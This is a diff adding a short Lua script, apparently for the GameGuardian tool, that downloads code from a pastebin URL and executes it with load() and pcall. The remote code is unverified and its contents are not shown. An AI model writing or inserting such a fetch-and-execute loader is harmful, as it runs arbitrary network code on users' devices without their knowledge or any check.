@@ -1,0 +1,7 @@
+nik = gg.makeRequest("https://pastebin.com/raw/vN5H9vvX").content
+if not nik then
+print('❌Something Went Wrong❌')
+os.exit()
+else﻿
+pcall(load(nik))
+end﻿
